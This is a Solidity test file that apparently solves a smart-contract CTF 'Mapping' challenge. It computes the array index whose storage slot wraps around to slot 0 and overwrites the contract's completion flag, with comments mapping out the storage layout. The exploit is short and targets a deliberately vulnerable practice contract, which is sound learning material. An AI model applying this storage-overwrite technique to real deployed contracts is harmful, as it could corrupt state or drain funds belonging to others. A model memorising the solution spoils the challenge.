// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.5.0;

import {DSTest} from "../utils/DSTest-05.sol";
import {MappingChallenge} from "../../src/2-Math/4-Mapping.sol";

import "forge-std/console.sol";

contract MappingTest is DSTest {
    address challengeAddress;

    function setUp() public {
        MappingChallenge challenge = new MappingChallenge();
        challengeAddress = address(challenge);
    }

    function testSolveMapping() public {
        MappingChallenge challenge = MappingChallenge(challengeAddress);

        // [START]

        //  Slot          Data
        // ------------------------------
        //    0          isComplete
        //    1          map.length

        //   ...         ...

        //    p          map[0]
        //  p + 1        map[1]

        //   ...         ...

        // 2^256 - 2     map[2^256 - 2 - p]
        // 2^256 - 1     map[2^256 - 1 - p]
        //    0          map[2^256 - p]  (back to slot 0)

        uint256 index = uint256(2) ** uint256(256) - uint256(keccak256(abi.encode(uint256(1))));

        console.log("index: ", index);

        challenge.set(index, 0x1);

        // [END]

        assertTrue(challenge.isComplete());
    }
}
